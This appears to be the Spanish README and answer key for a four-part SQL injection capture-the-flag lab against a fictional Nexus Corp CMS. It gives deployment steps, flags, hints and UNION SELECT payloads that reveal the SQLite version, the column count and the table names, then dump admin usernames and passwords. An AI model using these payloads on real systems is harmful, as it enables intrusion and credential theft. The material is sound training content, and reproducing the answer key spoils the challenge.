
# Instrucciones
# Enuciado:
Has sido contratado como consultor de seguridad para evaluar la infraestructura de Nexus Corp. Tu contacto interno ha descubierto que el sistema de gestión de contenidos de la empresa podría tener vulnerabilidades de SQL Injection. Tu misión: infiltrarte en el sistema y obtener la contraseña del administrador Martin para demostrar la gravedad del fallo de seguridad.




# Despliegue
Este reto se subdivide en 4
Se deben de poner como retos encadenados y poner el mismo enunciado en cada uno, cambiando la pregunta.

Necesitas instalar sqlite3 y npm

Una vez instalados usa:

```
npm start
```

Se pondrá el puerto de escucha en el 3000 por defecto

Para cambiarlo puedes usar: 

```
npm start -- --port 8081

```

# CTF SQLi  

## Contexto


---

## Pregunta 1: Identificar el motor de la base de datos  
**Respuesta:** `sqlite3.44.2`  
**Flag:** `flag{kn0w_your_pr3y}`  
**Pista:** La verdad está en la versión.

### Solución  
Inyecta consultas para obtener la versión de SQLite:

```sql
https://website.com/article?id=0 UNION SELECT 1,2,sqlite_version()
-- Opciones alternativas:
-- https://website.com/article?id=0 UNION SELECT sqlite_version(),NULL,NULL
-- https://website.com/article?id=0 UNION SELECT 1,sqlite_version(),3
```

---

## Pregunta 2: Determinar el número de columnas  
**Respuesta:** `3`  
**Flag:** `flag{Sc4nn1ng_Th3_H0r1z0n}`  
**Pista:** La unión hace la fuerza.

### Solución  
Usa `UNION SELECT` para detectar columnas válidas:
```sql
https://website.com/article?id=1 UNION SELECT 1,2,3
```

---

## Pregunta 3: Encontrar la tabla de usuarios  
**Respuesta:** `staff_users`  
**Flag:** `flag{t3_3nc0ntr3}`  
**Pista:** El maestro tiene todas las respuestas.

### Solución  
Extrae nombres de tablas desde `sqlite_master` (metadatos de SQLite):
```sql
https://website.com/article?id=0 UNION SELECT 1,2,group_concat(name) FROM sqlite_master WHERE type='table'
```
**Nota:** `sqlite_master` almacena la estructura de la base de datos.

---

## Pregunta 4: Obtener la contraseña de Martin  
**Respuesta:** `Bl4ck_s4bbath`  
**Flag:** `flag{DB_0v3rl0rd}`  
**pista:** utiliza || para concatenar

### Solución  
Concatena usuarios y contraseñas usando `||` (operador de concatenación en SQLite):
```sql
https://website.com/article?id=0 UNION SELECT 1,2,group_concat(username||':'||password) FROM staff_users
```
**Resultado esperado:**  
`Martin:Bl4ck_s4bbath,OtroUsuario:OtraContraseña,...`

